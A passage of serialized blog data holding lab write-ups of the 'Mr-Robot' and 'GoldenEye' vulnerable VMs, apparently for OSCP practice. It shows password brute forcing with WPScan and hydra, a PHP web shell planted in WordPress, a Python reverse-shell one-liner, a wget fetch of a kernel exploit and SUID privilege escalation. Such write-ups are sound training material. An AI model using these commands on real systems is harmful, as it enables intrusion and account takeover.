__ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935995098.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Wpscan intrude users and password&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wpscan --url http://192.168.124.4/  --usernames Elliot --passwords fsocity-sort.dic&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936001210.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;[Valid Combinations Found:\nUsername: Elliot, Password: ER28-0652\nLogin in wordpress&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;getshell\&quot;&gt;Getshell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#getshell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Visit Appearance-Editor,write shell code into 404.php\nThere are plenty of webshell in /usr/share/webbshells/php/\nUse php-reverse-shell.php\nRemember to change its ip and port\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936011245.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;listen port 1234 on kali.\nThen  visit any pay which  not exists.\n&lt;code&gt;nc -lvnp 1234&lt;/code&gt;\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936061435.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Found another user robot and its file\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936067906.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Decode password\nWrite ‘c3fcd3d76192e4007dfb496cca67e13b’ into hash.txt&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936335560.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nTurn to user robot&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;su robot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936356620.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h2 id=\&quot;privilege-escalation\&quot;&gt;Privilege escalation&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#privilege-escalation\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Try to escalate privilege through suid\nFind all the suid file.&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;find / -user root -perm -4000 -print 2&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936394011.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nNmap privilege escalation\nOnly can be used when nmap is version 2.02-5.21&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;/usr/local/bin/nmap --interactive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;!sh&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;whoami&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675936402754.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;code&gt;cat /root/key-3-of-3.txt&lt;/code&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;enclosure\&quot;&gt;Enclosure&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#enclosure\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935870791.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935877529.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675935887078.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1&quot;],&quot;text&quot;:[0,&quot;Method-1&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;exploit-wordpress&quot;],&quot;text&quot;:[0,&quot;Exploit wordpress&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;getshell&quot;],&quot;text&quot;:[0,&quot;Getshell&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;privilege-escalation&quot;],&quot;text&quot;:[0,&quot;Privilege escalation&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Mr-Robot&quot;],&quot;date&quot;:[3,&quot;2023-02-09T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1675935901724.PNG&quot;],[0,&quot;img/1675935906897.PNG&quot;],[0,&quot;img/1675935911648.PNG&quot;],[0,&quot;img/1675935995098.PNG&quot;],[0,&quot;img/1675936001210.PNG&quot;],[0,&quot;img/1675936011245.png&quot;],[0,&quot;img/1675936061435.PNG&quot;],[0,&quot;img/1675936067906.PNG&quot;],[0,&quot;img/1675936335560.PNG&quot;],[0,&quot;img/1675936356620.PNG&quot;],[0,&quot;img/1675936394011.png&quot;],[0,&quot;img/1675936402754.PNG&quot;],[0,&quot;img/1675935870791.PNG&quot;],[0,&quot;img/1675935877529.png&quot;],[0,&quot;img/1675935887078.PNG&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/9&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/godeneye&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;GodenEye&quot;],&quot;date&quot;:[3,&quot;2023-02-08T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap  -sV -O -Pn -T4 192.168.124.44 -p-\nnmap --script vuln 192.168.124.44 -p-\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\n```\nThe nmap scanning result is as enclosure.\nThe dirb found nothing.\n***\n# Method-1\n## step-1 Intrude the login page(failed)\n![](img/1675389865498.png)\n![](img/1675389870691.png)\nI find its login page,try to intrude it.\nAuthorization is made up of user:password.\n![](img/1675389847203.png)\n![](img/1675390018821.png)\n![](img/1675390162371.png)\nFind nothing.\n## step-2 View home page source.\n![](img/1675390345344.png)\n![](img/1675390355645.png)\n`&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;`\n![](img/1675390815369.png)\nIt&#39;s unicode,decode it as html,I get &#39;InvincibleHack3r&#39;.And in source page,i known that the user is boris.Attention please,&#39;boris&#39; not &#39;Boris&#39;.\n![](img/1675391828534.png)\n\nView source code of this page.In the end i find an explanatory note.\n![](img/1675391692695.png)\n## step-3 POP3 \nFrom nmap result,55007 is pop3 port.\n![](img/1675393082037.png)\nUse burpsuite to send packet.It response us slowly,be pacient.\nIntrude pop3 password.I guess its username is &#39;natalya&#39; or &#39;boris&#39;.\n```\nhydra -s 55007 -L username.txt  -P /usr/share/set/src/fasttrack/wordlist.txt -e nsr -t 22 192.168.124.44 pop3\n```\nThen I get password.Attention,intrude it successfully only with /usr/share/set/src/fasttrack/wordlist.txt.\n`natalya:bird`\n`boris:secret1!`\n## step-4 Login mailbox\n```\ntelnet 192.168.124.44 55007\n\nuser natalya\npass bird\n\nlist\n+OK 2 messages:\n1 631\n2 1048\n.\n\nretr 1\n```\nI find two mails.And the second is critical.\n![](img/1675394170762.png)\n![](img/1675394314719.png)\n## step-5 Login in gnocertdir\nEdit /etc/hosts\n![](img/1675394962917.png)\nVisit servernaya-station.com/gnocertdir\n![](img/1675395021833.png)\nThe username and password has be shown in the second mail.\nI find a mail of doak.Try to intrude doak&#39;s mailbox.\nThen Get doak:goat\n![](img/1675395868856.png)\nFind another account of this system in doak&#39;s mailbox.\nusername: dr_doak\npassword: 4England!\nSign in system with this account.\nI find a file named secret.txt.\n![](img/1675396334057.png)\nDownload picture for-007.jpg\nOpen this picture in notepad++,something intersting show.\n![](img/1675396627851.png)\nDecode &#39;eFdpbnRlcjE5OTV4IQ==&#39;,get &#39;xWinter1995x!&#39;\n## step-6 Moodlecms exploitation\nxWinter1995x! is the password of admin\nThe version of moodle cms is 2.2.3\n![](img/1675845464385.png)\nIt seems that we can use msf to get shell.\nBefore exploit it,set text editor.\n![](img/1675905870571.png)\n![](img/1675905558594.png)\n## Step-7 Privilege escalation\nIt&#39;s www-data now\nSearch vulnerability to escalate privilege.\n```\nsearchsploit linux ubuntu 3.13\n```\n![](img/1675906171442.png)\nUse 37292.c\nThe absolute path of shellcode is /usr/share/exploitdb/exploits/\nmove it to /home/kali\nedit  37292.c,because there is no gcc in  target host .Use cc\n![](img/1675911223227.png)\n\nchange shell to meterpreter\n```\nuse post/multi/manage/shell_to_meterpreter\nset session 1\nexploit\nsessions -i 2\nupload 37292.c\nshell\n```\n\nHow to use 37292.c will be described in it&#39;s code.\n```\nchmod 777 37292.c\ncc -o exp 37292.c\n./exp\n```\n![](img/1675912183070.png)\n\n***\n#  Method-2 Reverse shell\n## Step-6 Moodlecms exploitation\nIn &#39;Site administration-Server-System paths&#39;,I find a web which can be used to upload shellcode.\n\n```\npython -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.124.4\&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#39;\n```\n![](img/1675912534581.png)\nlisten port 6666 in vps.\n`nc lvnp 6666`\ncheck spell\n![](img/1675912972431.png)\nThen will get a shell\n![](img/1675913050473.png)\n ## Step-7 Privilege escalation\n Turn shell to python shell\n ```\n python -c &#39;import pty; pty.spawn(\&quot;/bin/bash\&quot;)&#39; \n ```\n![](img/1675914702007.png)\n\n```\npython3 -m http.server 5555\n```\nIn the shell\n`wget http://192.168.124.5:5555/37292.c`\n\n***\n# Enclosure\n![](img/1675329659408.png)\n![](img/1675329715883.png)\n```\nNot shown: 65531 closed tcp ports (reset)\nPORT      STATE SERVICE\n25/tcp    open  smtp\n| smtp-vuln-cve2010-4344: \n|_  The SMTP server is not Exim: NOT VULNERABLE\n| ssl-dh-params: \n|   VULNERABLE:\n|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use anonymous\n|       Diffie-Hellman key exchange only provide protection against passive\n|       eavesdropping, and are vulnerable to active man-in-the-middle attacks\n|       which could completely compromise the confidentiality and integrity\n|       of any data exchanged over the resulting session.\n|     Check results:\n|       ANONYMOUS DH GROUP 1\n|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://www.ietf.org/rfc/rfc2246.txt\n|   \n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://weakdh.org\n|       https://www.securityfocus.com/bid/74733\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n80/tcp    open  http\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#39;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n55006/tcp open  unknown\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n| ssl-dh-params: \n|   VULNERABLE:\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n55007/tcp open  unknown\nMAC Address: 00:0C:29:8D:FC:67 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 323.07 seconds\n```\n***\n# Command Summary&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/GodenEye.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675389865498.png&quot;],[0,&quot;img/1675389870691.png&quot;],[0,&quot;img/1675389847203.png&quot;],[0,&quot;img/1675390018821.png&quot;],[0,&quot;img/1675390162371.png&quot;],[0,&quot;img/1675390345344.png&quot;],[0,&quot;img/1675390355645.png&quot;],[0,&quot;img/1675390815369.png&quot;],[0,&quot;img/1675391828534.png&quot;],[0,&quot;img/1675391692695.png&quot;],[0,&quot;img/1675393082037.png&quot;],[0,&quot;img/1675394170762.png&quot;],[0,&quot;img/1675394314719.png&quot;],[0,&quot;img/1675394962917.png&quot;],[0,&quot;img/1675395021833.png&quot;],[0,&quot;img/1675395868856.png&quot;],[0,&quot;img/1675396334057.png&quot;],[0,&quot;img/1675396627851.png&quot;],[0,&quot;img/1675845464385.png&quot;],[0,&quot;img/1675905870571.png&quot;],[0,&quot;img/1675905558594.png&quot;],[0,&quot;img/1675906171442.png&quot;],[0,&quot;img/1675911223227.png&quot;],[0,&quot;img/1675912183070.png&quot;],[0,&quot;img/1675912534581.png&quot;],[0,&quot;img/1675912972431.png&quot;],[0,&quot;img/1675913050473.png&quot;],[0,&quot;img/1675914702007.png&quot;],[0,&quot;img/1675329659408.png&quot;],[0,&quot;img/1675329715883.png&quot;]]],&quot;digest&quot;:[0,&quot;355366de80df8cb1&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap  -sV -O -Pn -T4 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.44 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The nmap scanning result is as enclosure.\nThe dirb found nothing.&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method-1\&quot;&gt;Method-1&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method-1\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;step-1-intrude-the-login-pagefailed\&quot;&gt;step-1 Intrude the login page(failed)&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#step-1-intrude-the-login-pagefailed\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 